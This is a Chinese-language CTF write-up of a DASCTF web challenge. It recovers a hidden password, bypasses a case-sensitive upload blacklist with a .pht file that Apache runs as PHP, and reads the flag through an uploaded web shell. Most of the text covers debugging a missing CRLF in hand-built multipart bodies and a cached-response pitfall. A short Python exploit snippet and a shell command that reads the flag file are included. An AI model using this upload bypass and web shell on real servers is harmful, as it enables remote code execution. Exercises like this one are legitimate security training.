# Uploadfile — multipart 缺 CRLF 假象排查 + .pht 绕过上传 RCE

赛事：DASCTF（http-ctf2 平台，BUUCTF/CTFd #3027）
日期：2026-09-08
分类：Web / 文件上传
难度：medium（难度在调试而非构造）
Flag：CTF2{0a4dbd07-64bf-45f5-953f-4c71b2a201d6}

## 题目

/index.php 密码校验（8 段 substr 拼图在 HTML 注释里）→ 通过后 echo $next='fllllllllll1ag.php' → 上传页。PHP 5.5.9 + Apache 2.4.7 (mod_php5, Ubuntu)，/uploads/ 开目录列表、落盘名 md5(time())+ext。

## 解题

1. substr 拼图：p[0:5]=409e2, p[5:10]=7ea33, p[10:15]=842ed, p[15:20]=d5c7f, p[20:25]=112b6, p[25:32]=8d27f2a → 密码 409e27ea33842edd5c7f112b68d27f2a
2. 上传页 WAF（实测还原）：
   - 黑名单：in_array(strtolower(ext), [php, php3, php4, php5, phtml]) → "不要PHP文件！"
   - 白名单：in_array(ext, [jpg, jpeg, png, gif]) 大小写敏感 → 否则 "还想骗我？"
   - ext 提取 = substr(name, strrpos(name,'.')+1)
   - 黑名单不含 php6/php7/pht/phar/phtm/phP5（大小写敏感）→ .pht 直接过
3. Ubuntu php5.conf 的 FilesMatch `\.(ph(ar|p|tml))$` 使 .pht 由 mod_php5 执行 → 落盘 md5.pht 即 RCE
4. flag 在 /var/www/html/flag.php（90B，`$flag='CTF2{...}'`），另有 fi1eRead1.php include 它

## 最大坑：手写 multipart 缺 CRLF → 大量假拦截

自造 multipart 时每个 part 的内容之后**必须**有 `\r\n` 再接 boundary 行：

```
--BOUND\r\n
Content-Disposition: form-data; name="file"; filename="a.jpg"\r\n
Content-Type: image/png\r\n
\r\n
CONTENT\r\n          ← 这行 CRLF 缺了就全盘皆输
--BOUND--\r\n
```

缺 CRLF 时 PHP 的 rfc1867 解析器丢弃该文件 → $_FILES['file'] 未定义 → 页面走**默认分支**输出"还想骗我？"。表现为：无论传什么都拦、同一文件名时好时坏（其实是请求有效/无效交替）、"WAF 行为随时间窗口变化"的幻觉。曾据此误判"WAF 动态轮换"，轰炸 15 分钟全部无效请求，空耗约 1 小时。

排查方法：同一请求结构只改扩展名做对照（a.jpg 与 x.php6 同样返回"还想骗我"→ 请求本身坏了），再逐字节 diff 成功/失败请求的 body（本地 nc/HTTP server 自抓）。

## 次坑：openresty X-Cache 缓存 POST 响应

同 URL 连续请求会返回过期缓存响应（包括 POST），导致"同秒上传同名落盘"等假象。差分测试一律加 ?nc=随机数。

## 最小 exp

```python
body = (f'--{B}\r\nContent-Disposition: form-data; name="file"; filename="x.pht"\r\n'
        f'Content-Type: image/png\r\n\r\n').encode() + SHELL + b'\r\n' + f'--{B}--\r\n'.encode()
# POST /fllllllllll1ag.php → 回显 /var/www/html/uploads/md5(time()).pht
# GET /uploads/md5.pht?c=cat /var/www/html/flag.php
```

## 经验

- 上传题先看"拦截面"再构造：本题主线 30 分钟内可解，90% 耗时浪费在无效请求的假象上
- 自造 HTTP 报文必须抓包对照（curl -F 与手写 body 差一个 CRLF）；两个失败消息区分"WAF 拦"与"请求无效"不能靠猜，要用同构请求换文件名做 A/B
- 落盘名 md5(time()) 可预测 + 同秒覆盖，是排查落盘行为的重要指纹
